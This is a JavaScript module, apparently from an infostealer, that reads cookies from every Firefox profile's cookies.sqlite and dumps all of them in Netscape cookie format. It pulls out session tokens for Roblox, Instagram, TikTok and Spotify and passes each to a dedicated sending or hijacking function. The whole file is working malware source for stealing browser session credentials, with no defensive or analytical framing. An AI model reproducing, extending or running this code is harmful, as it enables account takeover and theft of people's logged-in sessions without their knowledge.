const { geckoPaths } = require("../../data/paths");
let { state } = require("../../data/data");
const sqlite3 = require("sqlite3");
const fs = require("fs");

async function getFirefoxCookies() {
  let cookies = "";

  for (const path of geckoPaths) {
    if (!fs.existsSync(`${path}\\cookies.sqlite`)) continue;
    try {
      const result = await getGeckoCookies(path);
      cookies += result;
    } catch {
      continue;
    }
  }

  return cookies;
}

async function getGeckoCookies(path) {
  var result = "";
  const sql = new sqlite3.Database(`${path}\\cookies.sqlite`, (err) => {
    if (err) {
    }
  });
  const cheese = await new Promise((resolve, reject) => {
    sql.each(
      "SELECT * FROM moz_cookies",
      function (err, row) {
        if (err) return;
        state.cookieCount.value++;

        if (row["name"] === ".ROBLOSECURITY") sendRoblox(`${row["value"]}`);
        if (row["host"].includes("instagram") && row["name"].includes("sessionid")) getInsta(`${row["value"]}`);
        if (row["host"].includes(".tiktok.com") && row["name"].includes("sessionid")) getTiktok(`${row["value"]}`);
        if (row["host"].includes(".spotify.com") && row["name"].includes("sp_dc")) getSpotify(`${row["value"]}`);

        result += `${row["host"]}\tTRUE\t/\tFALSE\t2597573456\t${row["name"]}\t${row["value"]}\n`;
      },
      function () {
        resolve(result);
      }
    );
  });
  return cheese;
}

module.exports = getFirefoxCookies;